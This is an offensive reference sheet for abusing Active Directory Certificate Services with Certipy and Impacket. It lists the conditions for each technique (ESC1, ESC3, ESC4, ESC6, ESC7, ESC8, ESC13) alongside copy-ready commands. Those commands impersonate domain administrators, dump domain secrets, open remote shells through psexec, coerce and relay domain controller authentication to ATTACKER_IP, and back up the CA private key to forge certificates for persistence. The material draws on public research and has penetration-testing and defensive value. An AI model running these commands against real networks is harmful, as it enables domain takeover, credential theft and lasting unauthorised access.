# Certipy ADCS Exploitation Reference

> 来源: SpecterOps "Certified Pre-Owned" whitepaper, HackTricks ADCS, certipy GitHub (ly4k), ired.team ADCS attacks

## ADCS Attack Surface Overview

Active Directory Certificate Services (ADCS) is Microsoft's PKI implementation for AD environments. Certificate Templates define how certificates are issued, and misconfigurations in these templates allow domain privilege escalation.

### Key AD Objects
- **pKIEnrollmentService**: Certificate Authority (CA) — issues certificates
- **pKICertificateTemplate**: Certificate templates — define enrollment parameters
- **Enrollment Web Service**: HTTP endpoint at `http://CA-server/certsrv/`

### Enrollment Permissions
Users need at minimum `Enroll` permission on a certificate template to request certificates. The key abuse vectors exploit over-permissive settings in template configuration.

## Enumeration

### certipy find — Enumerate Templates
```bash
# Full enumeration of all templates and CA configuration
certipy find -u 'user@domain.local' -p 'Password123' -dc-ip 10.0.0.10

# Only show vulnerable templates
certipy find -vulnerable -u 'user@domain.local' -p 'Password123' -dc-ip 10.0.0.10

# Output to file (JSON/HTML)
certipy find -u 'user@domain.local' -p 'Password123' -dc-ip 10.0.0.10 -output certipy_output

# With NTLM hash
certipy find -u 'user@domain.local' --hashes ':NTHASH' -dc-ip 10.0.0.10

# With Kerberos ticket
certipy find -u 'user@domain.local' -k -no-pass -dc-ip 10.0.0.10
```

### Key Vulnerable Template Indicators
| Attribute | Vulnerable Value | Exploit |
|-----------|-----------------|---------|
| `mspki-certificate-name-flag` | `ENROLLEE_SUPPLIES_SUBJECT` | ESC1 — supply arbitrary SAN |
| `pkiextendedkeyusage` | `Any Purpose` (2.5.29.37.0) | ESC2 — subCA certificate |
| `mspki-enrollment-flag` | Missing `CT_FLAG_NO_SECURITY_EXTENSION` | ESC9 |
| Template ACL | GenericAll/GenericWrite/WriteOwner/WriteDacl | ESC4 — overwrite template |
| CA Flag `EDITF_ATTRIBUTESUBJECTALTNAME2` | `0x00040000` set | ESC6 — universal SAN |

## ESC1: SAN Specification

### Condition
- Certificate template has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag
- `pkiextendedkeyusage` includes Client Authentication, Smart Card Logon, or Any Purpose
- Low-privilege user has `Enroll` permission

### Attack
```bash
# Request certificate with SAN = Domain Admin UPN
certipy req -u 'lowpriv@domain.local' -p 'pass' -ca 'CA-SERVER-CA' -template 'VulnTemplate' -upn 'administrator@domain.local' -dc-ip 10.0.0.10

# Request certificate with DNS SAN
certipy req -u 'lowpriv@domain.local' -p 'pass' -ca 'CA-SERVER-CA' -template 'VulnTemplate' -dns 'dc.domain.local' -dc-ip 10.0.0.10

# Output: administrator.pfx (PKCS#12 certificate bundle)
```

### Authenticate with Obtained Certificate
```bash
# Get TGT (Ticket Granting Ticket) for the impersonated user
certipy auth -pfx 'administrator.pfx' -dc-ip 10.0.0.10

# With domain specification
certipy auth -pfx 'administrator.pfx' -domain 'domain.local' -dc-ip 10.0.0.10

# Output: administrator.ccache (Kerberos ticket cache)
```

### Use the Ticket
```bash
export KRB5CCNAME=administrator.ccache
impacket-secretsdump 'domain.local/administrator@dc.domain.local' -k -no-pass
impacket-psexec 'domain.local/administrator@dc.domain.local' -k -no-pass
```

## ESC4: Template ACL Write

### Condition
- Low-privilege user has WriteOwner, WriteDacl, GenericWrite, GenericAll, or Owner rights on a certificate template

### Attack
```bash
# Exploit ESC4: modify template to enable SAN
certipy template -u 'lowpriv@domain.local' -p 'pass' -ca 'CA-SERVER-CA' -template 'VulnTemplate' -save-old -enable-san -dc-ip 10.0.0.10

# Now ESC1 applies — request cert as Domain Admin
certipy req -u 'lowpriv@domain.local' -p 'pass' -ca 'CA-SERVER-CA' -template 'VulnTemplate' -upn 'administrator@domain.local' -dc-ip 10.0.0.10

# Restore original template configuration
certipy template -u 'lowpriv@domain.local' -p 'pass' -ca 'CA-SERVER-CA' -template 'VulnTemplate' -restore -dc-ip 10.0.0.10
```

## ESC8: Web Enrollment NTLM Relay

### Condition
- ADCS Web Enrollment running on HTTP (not HTTPS)
- EPA (Extended Protection for Authentication) not enforced
- Attacker can coerce authentication from a high-privilege machine (DC)

### Check Web Enrollment
```bash
curl -I http://10.0.0.10/certsrv/ 2>/dev/null | head -5
```

### Attack
```bash
# Terminal 1: Start Certipy relay server
certipy relay -ca 'CA-SERVER-CA' -template 'DomainController'

# Terminal 2: Coerce authentication from DC
impacket-ntlmrelayx -t http://10.0.0.10/certsrv/certfnsh.asp -smb2support
python3 petitpotam.py -d 'domain.local' -u 'user' -p 'pass' 'ATTACKER_IP' 'DC_IP'

# Alternative coercion methods
python3 printerbug.py 'domain/user:pass'@DC_IP ATTACKER_IP
python3 dfscoerce.py -d 'domain.local' -u 'user' -p 'pass' 'ATTACKER_IP' 'DC_IP'
```

### EPA Bypass (WebSocket)
```bash
# If EPA is required, use WebSocket relay
certipy relay -ca 'CA-SERVER-CA' -template 'DomainController' -ws
```

## ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2

### Condition
- CA configuration has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag enabled
- Any user can specify SAN on any certificate request (even templates without ENROLLEE_SUPPLIES_SUBJECT)

### Check
```bash
certutil -config "CA-SERVER-CA" -getreg "policy\EditFlags" 2>/dev/null
# If output includes EDITF_ATTRIBUTESUBJECTALTNAME2 → vulnerable
```

### Attack
```bash
# Any template with Enroll permission works
certipy req -u 'user@domain.local' -p 'pass' -ca 'CA-SERVER-CA' -template 'User' -upn 'administrator@domain.local' -dc-ip 10.0.0.10
```

## ESC3: Enrollment Agent

### Condition
- Template with Certificate Request Agent EKU (1.3.6.1.4.1.311.20.2.1)
- Manager approval disabled or attacker has approval rights

### Attack
```bash
# Step 1: Enroll for Enrollment Agent certificate
certipy req -u 'user@domain.local' -p 'pass' -ca 'CA-SERVER-CA' -template 'EnrollmentAgent' -dc-ip 10.0.0.10

# Step 2: Request cert on behalf of Domain Admin
certipy req -u 'user@domain.local' -p 'pass' -ca 'CA-SERVER-CA' -template 'User' -on-behalf-of 'DOMAIN\administrator' -pfx 'user.pfx' -dc-ip 10.0.0.10
```

## ESC7: CA Access Rights

### Condition
- User has `ManageCA` or `ManageCertificates` rights on the CA

### Attack
```bash
# ManageCA: Add yourself as officer, approve pending requests
certipy ca -u 'user@domain.local' -p 'pass' -ca 'CA-SERVER-CA' -add-officer 'user' -dc-ip 10.0.0.10

# ManageCertificates: Issue pending failed certificate requests
certipy ca -u 'user@domain.local' -p 'pass' -ca 'CA-SERVER-CA' -issue-request <request_id> -dc-ip 10.0.0.10
```

## ESC13: OID Group Link

### Condition
- Certificate issuance policy maps certificate OIDs to AD group membership
- User can enroll in template that grants privileged group membership

### Attack
```bash
certipy req -u 'user@domain.local' -p 'pass' -ca 'CA-SERVER-CA' -template 'OIDTemplate' -dc-ip 10.0.0.10
# Certificate issuance auto-adds user to privileged AD group
```

## Persistence via ADCS

```bash
# Forge offline certificate for long-term persistence
certipy ca -u 'administrator@domain.local' -p 'pass' -dc-ip 10.0.0.10 -ca 'CA-SERVER-CA' -backup

# Create golden certificate
# Once CA private key is obtained, forge certificates for any user indefinitely
```

## 参考来源

- SpecterOps: "Certified Pre-Owned" — https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf
- Certipy GitHub (ly4k): https://github.com/ly4k/Certipy
- HackTricks ADCS: https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation
- ired.team: "ADCS Exploitation" — https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/adcs-+-petitpotam-ntlm-relay-obtain-administrator-ticket
- TrustedSec: "ADCS Attack Paths in BloodHound" — https://trustedsec.com/blog/adcs-attack-paths-in-bloodhound
